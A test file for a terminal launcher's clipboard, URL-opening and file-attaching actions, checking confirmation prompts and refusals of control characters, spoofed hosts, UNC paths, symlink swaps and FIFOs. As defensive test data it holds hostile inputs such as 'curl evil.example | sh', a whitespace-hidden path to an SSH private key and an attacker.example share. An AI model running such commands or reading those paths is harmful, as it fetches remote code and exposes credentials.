// Tests of the launcher's actions (slice 11 §4; fix rounds 1 to 4): each confirmed on the launcher's own prompt before
// it touches the machine, its lines wrapped, never cut. Copying shows the text (five rows, then how many more
// characters) and refuses control and bidirectional characters; opening names the host, refuses user info and
// anything but http and https; attaching refuses paths with hiding characters (and Windows UNC and device paths),
// shows the path by its text before the yes and the real one after it when they differ, refuses with one message,
// never waits on a FIFO, reads only the file confirmed, and reads exactly the size it found.

import { execFileSync } from "node:child_process";
import { mkdir, mkdtemp, rename, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
	act,
	attach,
	MAX_ATTACHMENT,
	openerCommand,
	type PromptTerminal,
	promptLines,
	wrap,
} from "../../../src/node/tui/actions.ts";

/**
 * A prompt 80 columns wide answering `answers` in order, recording what it was asked and what was written past the
 * filter.
 */
function terminal(...answers: boolean[]): PromptTerminal & { readonly asked: string[][]; readonly written: string[] } {
	const asked: string[][] = [];
	const written: string[] = [];
	return {
		columns: 80,
		asked,
		written,
		ask: async (lines) => {
			asked.push([...lines]);
			return answers.shift() ?? false;
		},
		write: (data) => written.push(data),
	};
}

describe("the prompt's lines", () => {
	it("removes control and format characters and wraps each line to the terminal's width, never cutting it", () => {
		expect(promptLines(["a\x1b]52;c;x\x07b\u200b\u202e", "x".repeat(40)], 20)).toEqual([
			"a]52;c;xb",
			"x".repeat(18),
			"x".repeat(18),
			"xxxx",
		]);
		// Wide characters count two columns, so a row never runs past the edge.
		expect(wrap("日本語の文字", 6)).toEqual(["日本語", "の文字"]);
	});
});

describe("copying", () => {
	it("shows every line up to five, then how many more; OSC 52 only once confirmed", async () => {
		const text = ["echo hello", "  ", "curl evil.example | sh", "4", "5", "6", "7"].join("\n");
		const declined = terminal(false);
		expect(await act({ kind: "copy", text }, declined)).toBe(false);
		expect(declined.asked[0]).toEqual([
			"  echo hello",
			"    ",
			"  curl evil.example | sh",
			"  4",
			"  5",
			"  … and 2 more characters",
			`Copy these ${text.length} characters (7 lines)? [y/N]`,
		]);
		expect(declined.written).toEqual([]);
		const accepted = terminal(true);
		expect(await act({ kind: "copy", text: "hello" }, accepted)).toBe(true);
		expect(accepted.written).toEqual([`\x1b]52;c;${Buffer.from("hello").toString("base64")}\x07`]);
	});

	it("wraps a long line instead of cutting it (Opus E6)", async () => {
		const text = `echo hello${" ".repeat(120)}; curl -s evil.example/x | sh`;
		const asked = terminal(false);
		await act({ kind: "copy", text }, asked);
		// Every character shown, in rows.
		expect(
			asked.asked[0]!.slice(0, -1)
				.map((row) => row.slice(2))
				.join(""),
		).toBe(text);
		expect(asked.asked[0]!.at(-1)).toBe(`Copy these ${text.length} characters (1 line)? [y/N]`);
		// Beyond five rows: how many characters are not shown.
		const long = terminal(false);
		await act({ kind: "copy", text: "y".repeat(76 * 7) }, long);
		expect(long.asked[0]!.slice(5)).toEqual([
			`  … and ${76 * 2} more characters`,
			"Copy these 532 characters (1 line)? [y/N]",
		]);
	});

	it("refuses text with control or bidirectional characters, without asking (Fable M1, Opus L3)", async () => {
		for (const text of ["a\x1b[2Jb", "a\rb", "a\u202eb", "a\u2066b"]) {
			const asked = terminal(true);
			await expect(act({ kind: "copy", text }, asked)).rejects.toThrow("control characters");
			expect(asked.asked).toEqual([]);
		}
	});
});

describe("opening a URL", () => {
	it("names the host first; refuses user info and other schemes (Fable L4)", async () => {
		const opened: string[] = [];
		const opener = async (url: string) => {
			opened.push(url);
		};
		await expect(
			act({ kind: "open", url: "https://google.com@evil.example/x" }, terminal(true), opener),
		).rejects.toThrow("without user info");
		for (const url of ["file:///etc/passwd", "javascript:alert(1)"]) {
			await expect(act({ kind: "open", url }, terminal(true), opener)).rejects.toThrow("only http and https");
		}
		const asked = terminal(true);
		expect(await act({ kind: "open", url: "https://a.example/?x=1&calc" }, asked, opener)).toBe(true);
		expect(asked.asked[0]).toEqual(["  https://a.example/?x=1&calc", "Open a.example in the browser? [y/N]"]);
		expect(opened).toEqual(["https://a.example/?x=1&calc"]);
	});
});

describe("the platform's opener", () => {
	it("gets a URL with shell metacharacters as one argument, never through a shell (Fable H2, Opus M3)", async () => {
		const url = `https://a.example/?a=1&calc|x^y%20z"q'r`;
		const opened: string[][] = [];
		expect(await act({ kind: "open", url }, terminal(true), async (target) => void opened.push([target]))).toBe(true);
		const href = new URL(url).href;
		expect(opened).toEqual([[href]]);
		expect(openerCommand(href, "win32")).toEqual(["rundll32", ["url.dll,FileProtocolHandler", href]]);
		expect(openerCommand(href, "darwin")).toEqual(["open", [href]]);
		expect(openerCommand(href, "linux")).toEqual(["xdg-open", [href]]);
	});
});

describe("attaching a file", () => {
	it("shows the path by its text before the yes; refuses a directory, a missing file and one over 16 MiB alike (Opus L2, E5, E9)", async () => {
		const dir = await mkdtemp(join(tmpdir(), "chord-attach-"));
		await writeFile(join(dir, "photo.png"), "png bytes");
		const asked = terminal(true);
		expect(await attach(join(dir, "photo.png"), asked)).toEqual({
			name: "photo.png",
			bytes: new TextEncoder().encode("png bytes"),
		});
		expect(asked.asked).toEqual([["File: photo.png", `In:   ${dir}`, "Attach this file? [y/N]"]]);
		// Dot segments resolved by the text alone (a link is not looked at before the yes): `x/..` is dropped even where
		// `x` is a file.
		const dotted = terminal(false);
		expect(await attach(join(dir, "photo.png/../beach.png"), dotted)).toBeNull();
		expect(dotted.asked).toEqual([["File: beach.png", `In:   ${dir}`, "Attach this file? [y/N]"]]);
		// A link: after the yes the file it leads to is asked about again.
		await symlink(join(dir, "photo.png"), join(dir, "beach.png"));
		const linked = terminal(true, false);
		expect(await attach(join(dir, "beach.png"), linked)).toBeNull();
		expect(linked.asked).toEqual([
			["File: beach.png", `In:   ${dir}`, "Attach this file? [y/N]"],
			["File: photo.png", `In:   ${dir}`, "It links here. Attach this file? [y/N]"],
		]);
		expect(await attach(join(dir, "beach.png"), terminal(true, true))).toMatchObject({ name: "photo.png" });
		await writeFile(join(dir, "big"), new Uint8Array(MAX_ATTACHMENT + 1));
		for (const path of [dir, join(dir, "missing"), join(dir, "big")]) {
			await expect(attach(path, terminal(true))).rejects.toThrow("attach: that file cannot be attached");
		}
		// Characters that hide or move what the prompt shows: refused without asking.
		for (const path of [
			`~/Pictures/beach.png${" ".repeat(100)}/../../.ssh/id_ed25519`,
			"~/a.png\t/../../.ssh/id_ed25519",
			"~/a\u202egnp.png",
			"~/a\u200b.png",
			" ~/a.png",
			"~/a.png\u00a0",
		]) {
			const refused = terminal(true);
			await expect(attach(path, refused)).rejects.toThrow("attach: that file cannot be attached");
			expect(refused.asked).toEqual([]);
		}
		await rm(dir, { recursive: true });
	});

	it("reads only the file confirmed: a parent directory swapped for a link after the yes is refused (Opus R1)", async () => {
		const dir = await mkdtemp(join(tmpdir(), "chord-attach-"));
		await mkdir(join(dir, "a"));
		await mkdir(join(dir, "b"));
		await writeFile(join(dir, "a", "notes.txt"), "shown");
		await writeFile(join(dir, "b", "notes.txt"), "secret");
		await symlink(join(dir, "a", "notes.txt"), join(dir, "link.txt"));
		const asked: string[][] = [];
		// The second prompt (the link's real path) is answered after the directory `a` became a link to `b`.
		const swapping: PromptTerminal = {
			columns: 80,
			ask: async (lines) => {
				asked.push([...lines]);
				if (asked.length === 2) {
					await rename(join(dir, "a"), join(dir, "a-old"));
					await symlink(join(dir, "b"), join(dir, "a"));
				}
				return true;
			},
			write: () => {},
		};
		await expect(attach(join(dir, "link.txt"), swapping)).rejects.toThrow("attach: that file cannot be attached");
		expect(asked[1]![1]).toBe(`In:   ${join(dir, "a")}`);
		await rm(dir, { recursive: true });
	});

	it("refuses UNC, device and //host paths on Windows without asking (Opus E9)", async () => {
		for (const path of [
			"\\\\attacker.example\\share\\x.png",
			"//attacker.example/share/x.png",
			"\\\\?\\C:\\x.png",
			"\\\\.\\pipe\\x",
			"C:\\Users\\a\\NUL",
			"C:\\Users\\a\\com1.png",
		]) {
			const refused = terminal(true);
			await expect(attach(path, refused, "win32")).rejects.toThrow("attach: that file cannot be attached");
			expect(refused.asked).toEqual([]);
		}
	});

	it("never waits on a FIFO: opened without blocking, refused as no regular file (Opus E12)", async () => {
		const dir = await mkdtemp(join(tmpdir(), "chord-attach-"));
		const fifo = join(dir, "fifo");
		execFileSync("mkfifo", [fifo]);
		await expect(attach(fifo, terminal(true))).rejects.toThrow("attach: that file cannot be attached");
		await rm(dir, { recursive: true });
	});
});
